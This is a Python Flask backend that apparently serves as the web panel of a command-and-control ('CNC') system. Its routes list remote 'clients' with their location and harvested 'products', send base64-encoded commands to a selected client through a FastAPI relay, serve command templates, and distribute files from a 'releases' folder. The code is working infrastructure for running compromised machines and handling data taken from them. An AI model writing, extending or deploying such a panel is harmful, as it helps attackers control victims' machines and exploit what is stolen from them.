from PoopBiter.products import PRODUCT_TYPE_TO_STRING, Product, ProductInfo, ProductType, TypedProduct
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS
import requests
import os
import base64
import struct
from pathlib import Path
import json


CNC_ROOT = "CornCake"

app = Flask(__name__, static_folder='frontend/build')
# Configure CORS to allow all methods and headers
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

CHERRY_URL = 'http://localhost:8000'  # Your FastAPI server URL


# API endpoints that proxy to FastAPI
@app.route('/api/clients', methods=['GET'])
def get_clients():
    try:
        response = requests.get(f'{CHERRY_URL}/get-clients')
        return jsonify(response.json()), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients/<client_id>', methods=['GET'])
def get_client(client_id):
    try:
        response = requests.get(f'{CHERRY_URL}/get-client/{client_id}')
        client_data = response.json()
        
        if 'location' not in client_data:
            client_data['location'] = "Unknown"

        # Parse each product's content
        if 'products' in client_data:
            parsed_products = {}
            product_paths = {}  # Map product IDs to their paths
            
            # Handle products as a list
            for product_path in client_data['products']:
                path = Path(product_path)
                try:
                    info = ProductInfo.from_path(path)
                    product_paths[info.product_id] = product_path
                except Exception as e:
                    print(
                        f"Failed to parse product info: {product_path}, skipping...")
                    continue

                try:
                    product = Product.from_path(path)
                    parsed_products[product.info.product_id] = product.displayable(
                    )
                except Exception as e:
                    print(
                        f"Exception while processing product {info}: {str(e)}")
                    parsed_products[info.product_id] = {
                        **info.displayable(),
                        f"formatted_type": f"{PRODUCT_TYPE_TO_STRING[info.product_type]} (Invalid)",
                        f"error": f"Error processing product: {str(e)}"
                    }
            
            # Replace products list with IDs and add the mappings
            client_data['products'] = list(parsed_products.keys())
            client_data['product_paths'] = product_paths
            client_data['parsed_products'] = parsed_products
        
        return jsonify(client_data), response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Request exception: {str(e)}")  # Debug log
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands', methods=['POST', 'OPTIONS'])
def send_command():
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        command_data = request.json.get('data', '')
        client_id = request.json.get('client_id', '')
        
        # Convert command data to base64
        encoded_data = base64.b64encode(command_data.encode()).decode()
        
        # Format the request body according to ClientCommand model
        payload = {
            'client_id': client_id,
            'data': encoded_data
        }
        
        response = requests.post(f'{CHERRY_URL}/send-command', json=payload)
        return jsonify(response.json()), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command-templates', methods=['GET'])
def get_command_templates():
    templates_dir = os.path.join(CNC_ROOT, 'templates')
    templates = []
    
    for filename in os.listdir(templates_dir):
        if filename.endswith('.json'):
            template_path = os.path.join(templates_dir, filename)
            with open(template_path, 'r') as f:
                template_data = json.load(f)
                templates.append({
                    'name': os.path.splitext(filename)[0],
                    'content': template_data
                })
    return jsonify(templates)

@app.route('/api/files', methods=['GET'])
def list_files():
    files_dir = os.path.join(CNC_ROOT, 'releases')
    if not os.path.exists(files_dir):
        return jsonify([])
    files = [f for f in os.listdir(files_dir) if os.path.isfile(os.path.join(files_dir, f))]
    return jsonify(files)

@app.route('/api/files/<filename>', methods=['GET'])
def get_file(filename):
    files_dir = os.path.join(CNC_ROOT, 'releases')
    file_path = os.path.join(files_dir, filename)
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    with open(file_path, 'rb') as file:
        file_data = file.read()
    return base64.b64encode(file_data).decode('utf-8')

# Serve React App
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    if path.startswith('api/'):
        return jsonify({'error': 'Not found'}), 404
    if path != "" and os.path.exists(app.static_folder + '/' + path):
        return send_from_directory(app.static_folder, path)
    else:
        return send_from_directory(app.static_folder, 'index.html')
